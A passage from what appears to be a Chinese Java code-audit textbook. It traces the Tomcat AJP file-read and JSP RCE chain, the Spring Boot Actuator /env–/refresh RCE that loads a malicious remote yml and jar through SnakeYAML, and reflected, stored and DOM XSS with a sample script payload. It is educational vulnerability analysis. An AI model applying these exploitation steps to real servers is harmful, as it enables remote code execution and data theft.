拼接结果仍然是“WEB-INF&#x2F;web.xml”</p><p>返回DefaultServle.serveResource()。然后判断path变量长度是否为0，为0则调用目录重定向方法，如图5-98所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222357635.png" alt="image-20220422235724501"></p><p>图5-98　调用目录重定向方法</p><p>下面的代码开始读取指定的资源文件，如图5-99和图5-100所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204230001484.png" alt="image-20220423000106404"></p><p>图5-99　读取指定的资源文件<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204230001649.png" alt="image-20220423000119926"></p><p>图5-100　resources对象</p><p>执行StandardRoot.getResource()方法，如图5-101所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231107103.png" alt="image-20220423110718240"></p><p>图5-101　执行StandardRoot.getResource()方法</p><p>getResource()方法中调用了很重要的validate()方法，并将path作为变量传递进去进行处理。&#x3D;&#x3D;这里会涉及不能通过“&#x2F;..&#x2F;..&#x2F;”的方式来读取webapp目录的上层目录中的文件的原因&#x3D;&#x3D;。首先是正常请求流程，如图5-102所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231110787.png" alt="image-20220423111031059"></p><p>图5-102　正常请求流程</p><p>我们可以看到正常请求后return的result路径就是文件所在的相对路径。</p><p>当我们尝试使用WEB-INF&#x2F;..&#x2F;..&#x2F;Test.txt来读取webapp以外的目录中的文件时，可以看到此时返回的result是null，而且会抛出异常，如图5-103所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231114696.png" alt="image-20220423111438530"></p><p>图5-103　尝试目录穿越（一）</p><p>所有原因都在于RequestUtil.normalize()函数对我们传递进来的路径的处理方式。</p><p>关键的点就在下面的截图代码中。我们传入的路径是“&#x2F;WEB-INF&#x2F;..&#x2F;..&#x2F;Test.txt”,首先程序会判断路径中是否存在“&#x2F;..&#x2F;”，答案是包含且索引大于8，所以第一个if 判断不会成功，也不会跳出while循环。此时处理我们的路径，截取“&#x2F;WEB-INF&#x2F;..”以后的内容。然后用String,indexOf()函数判断路径中是否包含“&#x2F;..&#x2F;”，答案是包含且索引为零，符合第二个if判断的条件，返回null，如图5-104所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231123156.png" alt="image-20220423112342059"></p><p>substring截取字符串</p><p>图5-104　尝试目录穿越（二）</p><p>此处的目标是不允许传递的路径的开头为“&#x2F;..&#x2F;”，且不允许同时出现两个连在一起的“&#x2F;..&#x2F;”，所以我们最多只能读取到webapp目录，无法读取webapp以外的目录中的文件。</p><p>要读取webapp目录下的其余目录内的文件，可以通过修改数据包中的“URI”参数来实现，如图5-105所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231131720.png" alt="image-20220423113142592"></p><p>图5-105　修改URI</p><p>程序最终会拼接出我们所指定文件的绝对路径，并作为返回值返回，如图5-106所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231133331.png" alt="image-20220423113328239"></p><p>图5-106　成功拼接文件路径</p><p>接下来回到getResource()函数进行文件读取，如图5-107所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231134869.png" alt="image-20220423113426720"></p><p>图5-107　文件读取</p><p>以下是任意文件读取的调用链，如图5-108所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231136453.png" alt="image-20220423113654297"></p><p>图5-108　任意文件读取的调用链</p><h4 id="6．RCE实现的原理"><a href="#6．RCE实现的原理" class="headerlink" title="6．RCE实现的原理"></a>6．RCE实现的原理</h4><p>前面介绍过Tomcat$ CATALINA_BASE&#x2F;conf&#x2F;web.xml配置文件中默认定义了两个Servlet。上述任意文件读取利用了DefaultServlet，而RCE则需要用到JspServlet。</p><p>默认情况下，JspServlet的url-pattern为.jsp和.jspx，因此它负责处理所有JSP文件的请求。</p><p>JspServlet主要完成以下工作。</p><p>根据JSP文件生成对应Servlet的Java代码（JSP文件生成类的父类org. apache.jasper.runtime.HttpJspBase——实现了Servlet接口）。</p><p>将Java代码编译为Java类。</p><p>构造Servlet类实例并且执行请求。</p><p>RCE本质是通过JspServlet来执行我们想要访问的.jsp文件。</p><p>RCE的前提是，首先想办法将包含需要执行的命令的文件（可以是任意文件后缀，甚至没有后缀）上传到webapp的目录下，才能访问该文件；然后通过JSP模板的解析造成RCE。</p><p>查看本次发送的AJP报文的内容，如图5-109所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231141387.png" alt="image-20220423114100529"></p><p>图5-109　AJP报文的内容</p><p>这里的“URI”参数必须以“.jsp”结尾，但是该JSP文件可以不存在。</p><p>其余3个参数与之前的没有区别，“path_info”参数对应的是我们上传的包含JSP代码的文件。</p><p>定位到JspServlet.Service()方法，如图5-110所示。</p><p>首先，将“servlet_path”的值取出赋值给变量jspUri，如图5-111所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231147739.png" alt="image-20220423114757631"></p><p>图5-111　赋值给变量jspUri</p><p>然后，将“path_info”参数对应的值取出并赋值给“pathInfo”变量，然后与“jspUri”进行拼接，如图5-112和图5-113所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231149292.png" alt="image-20220423114903178"></p><p>图5-112　赋值给变量pathInfo并拼接（一）<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231151134.png" alt="image-20220423115101028"></p><p>图5-113　赋值给变量pathInfo并拼接（二）</p><p>接下来调用serviceJspFile()方法，如图5-114所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231151204.png" alt="image-20220423115127117"></p><p>图5-114　调用serviceJspFile()方法</p><p>首先生成JspServletWrapper对象，如图5-115所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231152358.png"></p><p>然后调用JspServletWrapper.service()方法，如图5-116所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231153596.png"></p><p>图5-116　调用JspServletWrapper.service()方法</p><p>获取对应的servlet，如图5-117所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231153627.png" alt="image-20220423115357550"></p><p>图5-117　获取对应的servlet</p><p>调用该servlet的service方法，如图5-118所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231154811.png" alt="image-20220423115439720"></p><p>图5-118　调用的service方法</p><p>接下来解析上传文件中的Java代码。至此，RCE漏洞原理分析完毕。调用链如图5-119所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231155178.png" alt="image-20220423115532025"></p><p>图5-119　RCE漏洞原理分析完毕</p><h3 id="5-6-4-Spring-Boot远程命令执行"><a href="#5-6-4-Spring-Boot远程命令执行" class="headerlink" title="5.6.4　Spring Boot远程命令执行"></a>5.6.4　Spring Boot远程命令执行</h3><h4 id="漏洞原理以及POC构造分析"><a href="#漏洞原理以及POC构造分析" class="headerlink" title="漏洞原理以及POC构造分析"></a>漏洞原理以及POC构造分析</h4><p>漏洞的利用过程分为两个步骤，第一步是访问&#x2F;env接口修改配置属性，第二步是访问&#x2F;refresh接口对配置进行刷新，刷新过程会读取前面修改的配置并到指定的服务器上加载恶意yml文件。</p><p>payload如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231537412.png" alt="image-20220423153747285"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231537877.png" alt="image-20220423153758774"></p><p>通过POST 向&#x2F;env接口发起请求，正文中携带一个参数，该参数的参数名为“spring.cloud.bootstrap.location”，该参数的值为恶意yml文件的地址。</p><p>访问该接口需要目标中存在Spring Boot Actuator的依赖，如图5-120所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231538320.png" alt="image-20220423153844225"></p><p>图5-120　存在Spring Boot Actuator的依赖</p><p>这样就可以访问&#x2F;env接口。Spring Boot Actuator是一款可以辅助监控系统数据的框架，它可以监控很多系统数据，具有对应用系统的自省和监控的集成功能，也可以查看应用配置的详细信息，具体如下所示。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs armasm">显示应用程序的Health健康信息。<br>显示<span class="hljs-meta">Info</span>应用信息。<br>显示HTTP Request跟踪信息。<br>显示当前应用程序的“Metrics”信息。<br>显示所有的<span class="hljs-comment">@RequestMapping的路径信息。</span><br>显示应用程序的各种配置信息。<br>显示程序请求的次数、时间等各种信息。<br></code></pre></td></tr></table></figure><p>当我们向&#x2F;env接口发起GET请求时，Actuator会返回很多json格式的配置信息，如图5-121所示，所以Actuator配置不当或env接口暴露在外网时就会导致信息泄露。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231542412.png" alt="image-20220423154258269"></p><p>图5-121　返回json格式的配置信息</p><p>但是仅仅通过GET请求无法向Actuator传递参数来修改配置，此时通过POST请求发送payload时，Spring Boot服务器会返回图5-122所示的内容。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231548244.png" alt="image-20220423154846123"></p><p>系统会提示只允许GET方法，如果想通过POST传递参数，则需要目标中存在另一项依赖，如图5-123所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231550638.png" alt="image-20220423155012540"></p><p>图5-123　需要另一项依项</p><p>添加Spring Cloud的依赖后，再次使用POST传递payload时，Spring Boot就会返回图5-124所示的信息，意味着配置信息已经被更新。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231552392.png" alt="image-20220423155206309"></p><p>图5-124　Spring Boot返回的信息</p><p>更新配置后，接下来的步骤是通过POST请求&#x2F;refresh接口，POC如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231554640.png" alt="image-20220423155445546"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231554423.png" alt="image-20220423155458324"></p><p>当通过POST请求&#x2F;refresh接口刷新配置后，目标就会读取“spring.cloud. bootstrap.location”的值，并向读取到的值发起请求，将恶意yml文件加载到本地并进行解析，最终造成恶意代码执行。</p><p>其核心思路就是，首先通过Spring Cloud配置bootstrap.yml外置这一特点，在运行时期通过发送HTTP报文来修改“spring.cloud.bootstrap.location”，将其指向一个外部地址。然后通过&#x2F;refresh接口刷新配置，此时Spring Cloud就会根据“spring. cloud.bootstrap.location”去指定的地址加载yml格式的配置文件。接着加载到本地由SnakeYAML进行解析，利用SnakeYAML解析上的漏洞实例化ScriptEngineManager对象，通过实例化的ScriptEngineManager对象再去请求指定服务器上实现ScriptEngineFactory接口的恶意类。最后将恶意类加载到本地后将其实例化，从而执行其&#x3D;&#x3D;构造方法中&#x3D;&#x3D;的恶意代码。</p><p>请求&#x2F;env更新配置的过程比较简单，所以我们从&#x2F;refresh刷新配置这一步开始分析代码。当我们对&#x2F;refresh接口发起请求时，后台是由GenericPostableMvcEndpoint类来对该请求进行接收并进行处理的，代码如图5-125所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231604038.png" alt="image-20220423160359923"></p><p>根据注解可以看到，GenericPostableMvcEndpoint类通过&#x3D;&#x3D;invoke方法&#x3D;&#x3D;来处理针对&#x2F;refresh的POST请求。经过一系列的嵌套调用，程序会来到一个有着关键作用的SpringApplication类中。熟悉Spring Boot或者具有Spring Boot开发经验的读者一定不会对SpringApplication感到陌生，通常我们在编写一个Spring Boot程序时，在包的最外层会有一个使用@SpringBootApplication注解的类。该类有一个main方法是该SpringBoot程序启动的入口，该main方法会调用SpringApplication的run方法，如图5-126所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231612070.png" alt="image-20220423161210976"></p><p>图5-126　调用run方法</p><p>此次处理针对&#x2F;refresh的POST请求过程中也会调用SpringApplication的run方法，不同的是启动时调用的是静态run方法，而处理&#x2F;refresh请求时调用的是动态run方法。但是查看SpringApplication的源码可以发现，静态的run方法在其内部实现中还是调用了动态的run方法，如图5-127所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231615992.png" alt="image-20220423161550913"></p><p>图5-127　调用了动态的run方法</p><p>当执行到SpringApplication的run方法时，调用链如图5-128所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231617193.png" alt="image-20220423161740062"></p><p>图5-128　调用链</p><p>在正常启动一个Spring Boot程序的过程中，SpringApplication会遍历执行所有通过SpringFactoriesLoader可以查找到并加载的SpringApplicationRunListener。在Spring Boot启动过程中，&#x3D;&#x3D;加载Listener这一过程会在SpringApplication实例化时完成&#x3D;&#x3D;，具体代码如图5-129所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231625769.png" alt="image-20220423162546659"></p><p>图5-129　加载Listener</p><p>查找Listener，如图5-130所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231627868.png" alt="image-20220423162721700"></p><p>图5-130　查找Listener</p><p>针对这些Listener，我们只需要关注BootstrapApplicationListener和ConfigFIle-ApplicationListener。众所周知，监听器的作用是用来监听预先定义好的事件，这些事件都定义到一个叫作SpringApplicationRunListener的接口中，如图5-131所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231630803.png" alt="image-20220423163040710"></p><p>图5-131　预先定义好的事件</p><p>SpringApplication的run方法在执行过程中会触发started、environmentPrepared、contextPrepared等事件。我们要跟进的是BootstrapApplicationListener处理environmentPrepared事件。prepareEnvironment方法的作用是加载属性配置，当该方法执行完成后，所有的environment属性都会加载进来，包括application.properties和一些外部的配置，代码如图5-132所示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231633384.png" alt="image-20220423163302584">图5-132　加载属性配置</p><p>经过一系列的代码嵌套调用，会再次执行到SpringApplication的run方法，也就是说BootstrapApplicationListener在处理environmentPrepared事件时还会嵌套处理其他事件。这次仍然是跟进prepareEnvironment方法，并会依次调用以下Listener来处理environmentPrepared事件，调用到的类如图5-133所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231639401.png" alt="image-20220423163938277"></p><p>图5-133　调用到的类</p><p>循环调用各个Listener方法的代码如图5-134所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231642950.png" alt="image-20220423164222691"></p><p>图5-134　循环调用各个Listener方法的代码</p><p>调用ConfigFileApplicationListener处理prepareEnvironment事件时，如图5-135所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231735152.png" alt="image-20220423173553067"></p><p>图5-135　处理prepareEnvironment事件</p><p>ConfigFileApplicationListener会调用onApplicationEvent方法来处理传递进来的事件。首先，该方法会判断传递进来的事件是不是ApplicationEnvironmentPreparedEvent，代码如图5-136所示。根据之前传递进来的参数来判断，很明显结果为true。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231736944.png" alt="image-20220423173654838"></p><p>图5-136　判断传递进来的事件</p><p>然后，程序继续执行，会实例化一个Load对象并将environment作为参数传入，environment中存储着外部恶意yml文件的地址，代码如图5-137所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231738362.png" alt="image-20220423173840262"></p><p>图5-137　传入参数</p><p>接着，在load方法内会调用getSearchLocations()方法获取配置文件存储的路径，并循环进行加载，如图5-138所示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231739272.png" alt="image-20220423173929185"></p><p>图5-138　获取配置文件存储的路径</p><p>查询出来的第一个结果是恶意yml文件的存放地址，这里if的判断结果为true，所以调用load方法，将地址作为参数传入，跟进load方法后继续执行到PropertySourcesLoader的load方法。该方法内会循环判断两个SourceLoader是否可以加载并解析example.yml，两个SourceLoader如图5-139所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231741320.png" alt="image-20220423174137222"></p><p>图5-139　两个SourceLoader</p><p>判断的方法其实很简单，即获取这两个SourceLoader各自支持解析文件的文件后缀，PropertiesPropertySourceLoader支持的是.properties和.xml后缀的文件解析，YamlPropertySourceLoader支持的是.yml和.yaml后缀的文件解析。因此结果很明显，后续负责请求example.yml的是YamlPropertySourceLoader，具体代码如图5-140所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231744444.png" alt="image-20220423174420305"></p><p>图5-140　负责请求的代码</p><p>YamlPropertySourceLoader会进行一个操作，即调用第三方库snakeyaml来负责解析example.yml。snakeyaml可以将Java对象序列化为yml，同样也可以将yml反序列化为Java对象，因此产生该漏洞的最主要的原因就是snakeyaml对传入的数据没有进行任何限制，直接进行了反序列化行为，从而导致远程代码执行。example.yml的内容如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231747738.png" alt="image-20220423174758616"></p><p>从这个yml文件中可以清楚地看出这段恶意代码的目的，通过snakeyaml将其反序列化为一个ScriptEngineManager对象。</p><p>ScriptEngineManager有两个构造函数，其中一个构造函数的参数是ClassLoader类型，这里就利用了这个构造函数。ScriptEngineManager在实例化时会通过URLClassLoader去指定的位置加载一个恶意类。URLClassLoader在将恶意类加载到本地后会直接将其实例化，从而触发写在恶意类的构造函数中的恶意代码。yaml-payload.jar中的恶意代码如图5-141所示，该恶意类要实现ScriptEngineFactory的原因会在后续章节进行说明。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231752368.png" alt="image-20220423175253247"></p><p>图5-141　yaml-payload.jar中的恶意代码</p><p>snakeyaml将example.yml解析到本地后的格式如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231755875.png" alt="image-20220423175511750"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231755435.png" alt="image-20220423175535910"></p><p>在snakeyaml后续的执行过程中，会根据其中的tag循环获得其对应的构造函数对象。然后再获取其构造函数的参数数量和参数类型，循环完成后会通过Constructor.newInstance的方式实例化对象，其代码如图5-142所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231757542.png" alt="image-20220423175738369"></p><p>图5-142　循环完成后实例化对象</p><p>最终在目标机器上执行的代码如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231758949.png" alt="image-20220423175800839"></p><h2 id="5-7-跨站脚本（XSS"><a href="#5-7-跨站脚本（XSS" class="headerlink" title="5.7　跨站脚本（XSS"></a>5.7　跨站脚本（XSS</h2><h3 id="5-7-1-跨站脚本漏洞简介"><a href="#5-7-1-跨站脚本漏洞简介" class="headerlink" title="5.7.1　跨站脚本漏洞简介"></a>5.7.1　跨站脚本漏洞简介</h3><p>从Web应用上来看，攻击者可以控制的参数包括URL参数、post提交的表单数据以及搜索框提交的搜索关键字。一种对该漏洞的审计策略如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231942811.png" alt="image-20220423194214651"></p><p>图5-143　XSS漏洞的利用方式</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">（1）收集输入、输出点。<br>（2）查看输入、输出点的上下文环境。<br>（3）判断Web应用是否对输入、输出做了防御工作（如过滤、扰乱以及编码）。<br></code></pre></td></tr></table></figure><p>下面通过实际案例对反射型、存储型与DOM型这3类XSS漏洞的代码审计方法进行简要介绍。</p><h3 id="5-7-2-反射型XSS漏洞"><a href="#5-7-2-反射型XSS漏洞" class="headerlink" title="5.7.2　反射型XSS漏洞"></a>5.7.2　反射型XSS漏洞</h3><p>反射型XSS漏洞通过外部输入，然后直接在浏览器端触发。在白盒审计的过程中，我们需要寻找带有参数的输出方法，然后根据输出方法对输出内容回溯输入参数。</p><p>下面的JSP代码展示了反射型XSS漏洞产生的大致形式。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231946415.png" alt="image-20220423194658308"></p><p>由此可知，这份JSP代码会将变量name与studentId输出到前端，而这两个变量是从HttpServletRequest请求对象中取得的。由于这份代码并未对输入和输出数据进行过滤、扰乱以及编码方面的工作，因为无法对XSS漏洞进行防御。</p><p>正常的使用方法如下<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231947534.png" alt="image-20220423194751449"></p><p>其执行结果如图5-144所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231948149.png" alt="image-20220423194804974"></p><p>图5-144　不插入XSS Payload的测试</p><p>恶意的PoC如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231948705.png" alt="image-20220423194821624"></p><p>其执行结果如图5-145所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231949278.png" alt="image-20220423194915121"></p><p>图5-145　插入XSS Payload的测试</p><h3 id="5-7-3-存储型XSS漏洞"><a href="#5-7-3-存储型XSS漏洞" class="headerlink" title="5.7.3　存储型XSS漏洞"></a>5.7.3　存储型XSS漏洞</h3><p>为了利用存储型XSS这种漏洞，攻击者需要将利用代码保存在数据库或者文件中，当Web程序读取利用代码并输出在页面时执行利用代码。</p><p>在挖掘存储型XSS漏洞时，要统一寻找“输入点”和“输出点”。由于“输入点”和“输出点”可能不在同一个业务流中，在挖掘这类漏洞时，可以考虑通过以下方法提高效率。</p><p>（1）黑白盒结合。</p><p>（2）通过功能、接口名、表名、字段名等角度做搜索。</p><p>下述案例分析将讲述对博客系统ZrLog 1.9.1的存储型XSS的挖掘过程（注意：在编写本书时，zrlog已经升级到2.1.15-SNAPSHOT，本文通过旧版本进行案例分析）。</p><h4 id="1．寻找“输入点”接口"><a href="#1．寻找“输入点”接口" class="headerlink" title="1．寻找“输入点”接口"></a>1．寻找“输入点”接口</h4><p>首先，对zrlog_v1.9.1.0227进行安装和部署。下载zrlog 1.9.1的War包，并进行安装、数据初始化。</p><p>然后，登录管理员账号，并在网站设置→基本信息→网站标题处插入恶意XSS Payload“<script>alert('Ms08067')</script>”，并单击“提交”按钮，如图5-146所示。</p><p>图5-146　插入XSS Payload的测试</p><p>如果受害者通过浏览器访问该网站，浏览器会依据数据库中存储的字段对网页进行渲染，受害者会被动地受到恶意代码的攻击，如图5-147所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231954811.png" alt="image-20220423195440664"></p><p>图5-147　受害者受到了XSS Payload的攻击</p><p>为了通过HTTP请求定位到源码，此时也可以使用TamperData等抓包工具抓取HTTP请求，如图5-148所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231955803.png" alt="image-20220423195520638"></p><p>图5-148　使用Tamper Data抓取HTTP请求</p><p>由图5-148可知，攻击者可通过接口“POST&#x2F;api&#x2F;admin&#x2F;website&#x2F;update”向数据库中写入XSSpayload。</p><h4 id="2．审计“输入点”代码"><a href="#2．审计“输入点”代码" class="headerlink" title="2．审计“输入点”代码"></a>2．审计“输入点”代码</h4><p>通过查看zrlog工程部署目录中的&#x3D;&#x3D;WEB-INF&#x2F;web.xml&#x3D;&#x3D;文件，可发现该开源CMS通过类com.zrlog.web.config.ZrLogConfig进行访问控制。为了查看该类的源码，我们可以在该目录中找到Java的字节码文件“&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;zrlog&#x2F;web&#x2F;config&#x2F; ZrLogConfig.class”。为了通过该字节码文件查看源码，我们可以借用JD-GUI等工具进行反编译，如图5-149所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204231957342.png" alt="image-20220423195710150"></p><p>图5-149　使用JD-GUI反编译.class文件</p><p>通过审计该类的源码，我们可以发现这份源码的路由配置信息，如图5-150所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232005374.png" alt="image-20220423200516103"></p><p>图5-150　查看ZrlogConfig类的路由配置信息</p><p>通过审计configure(Routes routes)方法的源码可以发现，部分路由信息位于类AdminRoutes中。我们接着对该类的源码做审计，如图5-151所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232006650.png" alt="image-20220423200621477"></p><p>图5-151　查看AdminRoutes类的路由配置信息</p><p>由图5-151可知，请求地址“&#x2F;api&#x2F;admin&#x2F;website”对应到了类“WebSiteController”。我们接着对该类的源码进行审计，如图5-152所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232008660.png" alt="image-20220423200800492"></p><p>图5-152　查看WebSiteController类的update方法</p><p>由图5-152可知，方法update会将由HTTP请求传输过来的用户数据储存到Map对象requestMap中，并通过类com.zrlog.model.WebSite的updateByKV方法进行数据更新。为了判断系统在存入数据库前是否进行了防御工作，必须对updateByKV方法做进一步审计。此时，为了审计该方法的源码，我们还可以到GitHub上下载zrlog 1.9.1的源码。在对类文件&#x2F;data&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;zrlog&#x2F;model&#x2F;WebSite.java的源码进行审计后，可发现update方法未对数据进行过滤、扰乱以及编码，就将数据存放至数据库，如图5-153所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232010832.png" alt="image-20220423201052708"></p><p>图5-153　查看WebSite类的updateByKV方法</p><p>通过上述分析可知，这套Web系统未对用户输入进行防御工作。接下来，我们对“输出点”进行审计。这套Web系统采用了MVC架构，其中的“V”（表现层）采用了jsp。我们对输出“网站标题”的位置进行审计，如图5-154所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232015176.png" alt="image-20220423201501058"></p><p>图5-154　审计header.jsp中的表达式</p><p>由图5-154可知，“${webs.title}”这种写法未做转义，可成为触发XSS漏洞的一环。</p><h3 id="5-7-4-DOM型XSS漏洞"><a href="#5-7-4-DOM型XSS漏洞" class="headerlink" title="5.7.4　DOM型XSS漏洞"></a>5.7.4　DOM型XSS漏洞</h3><p>DOM型XSS漏洞是基于Document ObjectModel（文本对象模型）的一种XSS漏洞，客户端的脚本程序可以通过DOM动态地操作和修改页面内容。DOM型XSS漏洞不需要与服务器交互，它只发生在客户端处理数据阶段。粗略地说，DOM XSS漏洞的成因是不可控的危险数据，未经过滤被传入存在缺陷的JavaScript代码处理。</p><p>下面的JSP代码展示了DOM型XSS漏洞的大致形式。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232020817.png" alt="image-20220423202015720"></p><p>恶意的PoC如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232023732.png" alt="image-20220423202256952"></p><p>其执行结果如图5-155所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232023190.png" alt="image-20220423202316089"></p><p>图5-155　DOM型XSS漏洞的执行结果</p><p>DOM型XSS漏洞常见的输入输出点如表5-4所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232025802.png" alt="image-20220423202517603"></p><p>表5-4　DOM型XSS漏洞常见的输入输出点</p><p>XSS漏洞的危害不局限于窃取Cookie、钓鱼攻击，还可以衍生出很多攻击利用方式（可以说，前端页面能做的事它都能做），希望读者朋友们予以重视。</p><h2 id="5-8-不安全的反序列化"><a href="#5-8-不安全的反序列化" class="headerlink" title="5.8　不安全的反序列化"></a>5.8　不安全的反序列化</h2><h3 id="5-8-1-不安全的反序列化漏洞简介"><a href="#5-8-1-不安全的反序列化漏洞简介" class="headerlink" title="5.8.1　不安全的反序列化漏洞简介"></a>5.8.1　不安全的反序列化漏洞简介</h3><p>Java序列化及反序列化处理在基于Java架构的Web应用中具有尤为重要的作用。例如位于网络两端、彼此不共享内存信息的两个Web应用在进行远程通信时，无论相互间发送何种类型的数据，在网络中实际上都是以二进制序列的形式传输的。为此，发送方必须将要发送的Java 对象序列化为字节流，接收方则需要将字节流再反序列化，还原得到Java 对象，才能实现正常通信。当攻击者输入精心构造的字节流被反序列化为恶意对象时，就会造成一系列的安全问题。</p><h3 id="5-8-2-反序列化基础"><a href="#5-8-2-反序列化基础" class="headerlink" title="5.8.2　反序列化基础"></a>5.8.2　反序列化基础</h3><p>序列化是指将对象转化为字节流，其目的是便于对象在内存、文件、数据库或者网络之间传递。反序列化则是序列化的逆过程，即字节流转化为对象的过程，通常是程序将内存、文件、数据库或者网络传递的字节流还原成对象。在Java原生的API中，序列化的过程由ObjectOutputStream类的writeObject()方法实现，反序列化过程由ObjectInputStream类的readObject()方法实现。将字节流还原成对象的过程都可以称作反序列化，例如，JSON串或XML串还原成对象的过程也是反序列化的过程。同理，将对象转化成JSON串或XML串的过程也是序列化的过程，如图5-156所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204232038534.png" alt="image-20220423203816408"></p><p>图5-156　序列化与反序列化示意图</p><p>Java序列化通过&#x3D;&#x3D;ObjectOutputStream类的writeObject()方法&#x3D;&#x3D;完成，能够被序列化的类必须要实现&#x3D;&#x3D;Serializable接口或者Externalizable接口&#x3D;&#x3D;。Serializable接口是一个标记接口，其中不包含任何方法。Externalizable接口是Serializable子类，其中包含writeExternal()和readExternal()方法，分别在序列化和反序列化的时候自动调用。开发者可以在这两个方法中添加一些操作，以便在反序列化和序列化的过程中完成一些特殊的功能。<img 